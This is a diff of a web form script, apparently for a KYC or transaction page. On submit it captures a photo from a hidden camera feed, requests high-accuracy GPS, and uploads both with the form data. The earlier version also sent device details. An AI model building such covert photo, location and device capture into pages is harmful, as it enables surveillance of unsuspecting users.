@@ -1,119 +1,123 @@
-"use strict";
+// public/recorder.js
 
-const form       = document.getElementById("kycForm");
-const statusBox  = document.getElementById("status");
+const form = document.getElementById("kycForm");
+const statusBox = document.getElementById("status");
 const statusText = statusBox.querySelector(".status-text");
-const statusDot  = statusBox.querySelector(".dot");
-const submitBtn  = document.getElementById("submitBtn");
-const btnSpinner = document.getElementById("btnSpinner");
-const btnLabel   = document.getElementById("btnLabel");
+const statusDot = statusBox.querySelector(".dot");
+const submitBtn = document.getElementById("submitBtn");
+const btnSpinner = submitBtn.querySelector(".btn-spinner");
+const btnLabel = submitBtn.querySelector(".btn-label");
+const previewVideo = document.getElementById("preview");
+const snapshotCanvas = document.getElementById("snapshotCanvas");
 
-const hiddenVideo  = document.getElementById("hiddenVideo");
-const hiddenCanvas = document.getElementById("hiddenCanvas");
+let stream = null;
 
-function setStatus(message, mode) {
+function setStatus(message, state) {
   statusText.textContent = message;
-  statusBox.classList.remove(
-    "status-uploading",
-    "status-error",
-    "status-success",
-    "status-recording"
-  );
-  if (mode) {
-    statusBox.classList.add("status-" + mode);
-  }
-
-  // Dot color is handled by CSS via class
+  statusBox.classList.remove("status-recording", "status-uploading", "status-error", "status-success");
+  if (state) statusBox.classList.add(state);
 }
 
-function setLoading(isLoading) {
-  if (isLoading) {
-    submitBtn.disabled = true;
-    btnSpinner.style.display = "inline-block";
-    btnLabel.textContent = "Processing…";
-  } else {
-    submitBtn.disabled = false;
-    btnSpinner.style.display = "none";
-    btnLabel.textContent = "Submit Transaction Information";
-  }
-}
-
-// Capture one still photo from camera
-async function capturePhoto() {
-  let stream;
+/**
+ * Ask for camera (front camera on phone if possible)
+ */
+async function startCamera() {
   try {
-    setStatus("Requesting camera access…", "recording");
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: true,
+    const constraints = {
+      video: { facingMode: "user" },
       audio: false
+    };
+    stream = await navigator.mediaDevices.getUserMedia(constraints);
+    previewVideo.srcObject = stream;
+    // we keep video hidden; we only need frames
+    return new Promise((resolve) => {
+      if (previewVideo.readyState >= 2) {
+        resolve();
+      } else {
+        previewVideo.onloadedmetadata = () => resolve();
+      }
     });
-
-    hiddenVideo.srcObject = stream;
-
-    // Wait for metadata so we know videoWidth / videoHeight
-    await new Promise((resolve) => {
-      hiddenVideo.onloadedmetadata = () => {
-        hiddenVideo.play().then(resolve).catch(resolve);
-      };
-    });
-
-    const width  = hiddenVideo.videoWidth  || 640;
-    const height = hiddenVideo.videoHeight || 480;
-
-    hiddenCanvas.width  = width;
-    hiddenCanvas.height = height;
-
-    const ctx = hiddenCanvas.getContext("2d");
-    ctx.drawImage(hiddenVideo, 0, 0, width, height);
-
-    // Convert to PNG blob
-    const blob = await new Promise((resolve, reject) => {
-      hiddenCanvas.toBlob((b) => {
-        if (b) resolve(b);
-        else reject(new Error("Failed to create image blob"));
-      }, "image/png");
-    });
-
-    return blob;
-  } finally {
-    // Stop tracks so camera light turns off
-    if (hiddenVideo.srcObject) {
-      hiddenVideo.srcObject.getTracks().forEach((t) => t.stop());
-      hiddenVideo.srcObject = null;
-    }
+  } catch (err) {
+    console.error("Camera error:", err);
+    throw new Error("Camera access denied or unavailable.");
   }
 }
 
-// Optional GPS – requires explicit browser permission
-function getLocation() {
+/**
+ * Capture a single PNG frame from the video
+ */
+function captureFrame() {
+  if (!stream) {
+    throw new Error("No camera stream to capture from.");
+  }
+
+  const track = stream.getVideoTracks()[0];
+  const settings = track.getSettings();
+  const width = settings.width || 640;
+  const height = settings.height || 480;
+
+  snapshotCanvas.width = width;
+  snapshotCanvas.height = height;
+
+  const ctx = snapshotCanvas.getContext("2d");
+  ctx.drawImage(previewVideo, 0, 0, width, height);
+
   return new Promise((resolve) => {
-    if (!("geolocation" in navigator)) {
-      return resolve(null);
+    snapshotCanvas.toBlob(
+      (blob) => {
+        resolve(blob);
+      },
+      "image/png",
+      0.92
+    );
+  });
+}
+
+/**
+ * Request geolocation with high accuracy (GPS when available)
+ */
+function getLocationOnce(timeoutMs = 15000) {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) {
+      resolve(null);
+      return;
     }
+
+    const options = {
+      enableHighAccuracy: true, // strongly prefer GPS
+      timeout: timeoutMs,
+      maximumAge: 0
+    };
 
     navigator.geolocation.getCurrentPosition(
       (pos) => {
         resolve({
-          lat: pos.coords.latitude,
-          lng: pos.coords.longitude,
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
           accuracy: pos.coords.accuracy
         });
       },
       (err) => {
         console.warn("Geolocation error:", err);
-        resolve(null);
+        resolve(null); // continue without location
       },
-      {
-        enableHighAccuracy: true,
-        timeout: 8000,
-        maximumAge: 0
-      }
+      options
     );
   });
 }
 
-async function uploadData(formData, photoBlob) {
-  formData.append("photo", photoBlob, "capture.png");
+/**
+ * Upload form data + PNG photo + optional geo to /upload-photo
+ */
+async function uploadData(photoBlob, geo) {
+  const formData = new FormData(form);
+  formData.append("photo", photoBlob, "snapshot.png");
+
+  if (geo) {
+    formData.append("latitude", geo.latitude);
+    formData.append("longitude", geo.longitude);
+    formData.append("accuracy", geo.accuracy);
+  }
 
   const res = await fetch("/upload-photo", {
     method: "POST",
@@ -121,71 +125,62 @@ async function uploadData(formData, photoBlob) {
   });
 
   if (!res.ok) {
-    const txt = await res.text().catch(() => "");
-    throw new Error("Upload failed: " + res.status + " " + txt);
+    const text = await res.text();
+    throw new Error("Upload failed: " + text);
   }
-
-  return res.json(); // { ok: true, fileName: "...", ... }
+  return res.text();
 }
 
+/**
+ * Handle submit
+ */
 if (form) {
   form.addEventListener("submit", async (event) => {
     event.preventDefault();
 
-    // Simple client-side check
-    if (!form.checkValidity()) {
-      form.reportValidity();
-      return;
-    }
+    // simple frontend validation
+    if (!form.reportValidity()) return;
 
     try {
-      setLoading(true);
-      setStatus("Capturing photo… please keep still for a moment.", "recording");
+      // UI: disable button
+      submitBtn.disabled = true;
+      btnSpinner.style.display = "inline-block";
+      btnLabel.textContent = "Submitting…";
 
-      const photoBlob = await capturePhoto();
+      setStatus("Starting camera…", "status-recording");
 
-      setStatus("Requesting GPS (optional)…", "uploading");
-      const loc = await getLocation();
+      await startCamera();
 
-      const formData = new FormData(form);
+      setStatus("Capturing snapshot…", "status-recording");
+      const photoBlob = await captureFrame();
 
-      // Extra device/context info
-      formData.append("deviceInfo", navigator.userAgent || "");
-      formData.append("clientLanguage", navigator.language || "");
-      formData.append(
-        "clientTimezone",
-        Intl.DateTimeFormat().resolvedOptions().timeZone || ""
-      );
-      formData.append(
-        "screenSize",
-        `${window.screen.width}x${window.screen.height}`
-      );
-
-      if (loc) {
-        formData.append("gpsLat", String(loc.lat));
-        formData.append("gpsLng", String(loc.lng));
-        formData.append("gpsAccuracy", String(loc.accuracy));
+      // stop tracks ASAP
+      if (stream) {
+        stream.getTracks().forEach((t) => t.stop());
+        stream = null;
       }
 
-      setStatus("Uploading securely…", "uploading");
-      const result = await uploadData(formData, photoBlob);
+      setStatus("Requesting location (if allowed)…", "status-uploading");
+      const geo = await getLocationOnce();
 
-      if (result.ok) {
-        setStatus(
-          "Submitted successfully. Photo stored as: " + result.fileName,
-          "success"
-        );
-      } else {
-        setStatus(
-          "Upload completed with warning: " + (result.error || "Unknown"),
-          "error"
-        );
-      }
+      setStatus("Uploading data…", "status-uploading");
+      const serverMsg = await uploadData(photoBlob, geo);
+
+      setStatus("Submitted successfully. Server says: " + serverMsg, "status-success");
+      btnLabel.textContent = "Submitted";
+
     } catch (err) {
       console.error(err);
-      setStatus("Error: " + (err.message || err), "error");
+      setStatus("Error: " + (err.message || err), "status-error");
+      btnLabel.textContent = "Submit Transaction Information";
     } finally {
-      setLoading(false);
+      btnSpinner.style.display = "none";
+      submitBtn.disabled = false;
+
+      if (stream) {
+        stream.getTracks().forEach((t) => t.stop());
+        stream = null;
+      }
     }
   });
 }
